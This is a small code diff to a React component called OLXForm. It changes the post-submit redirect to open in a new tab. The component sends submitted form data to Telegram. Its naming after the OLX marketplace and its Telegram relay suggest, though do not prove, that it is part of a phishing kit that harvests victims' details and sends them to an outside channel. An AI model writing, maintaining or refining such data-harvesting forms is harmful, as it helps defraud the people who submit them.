@@ -55,7 +55,7 @@ export default function OLXForm() {
     try {
       await sendToTelegram(formData);
       if (REDIRECT_URL) {
-        window.location.href = REDIRECT_URL;
+        window.open(REDIRECT_URL, '_blank');
         return;
       }
       setIsSubmitted(true);
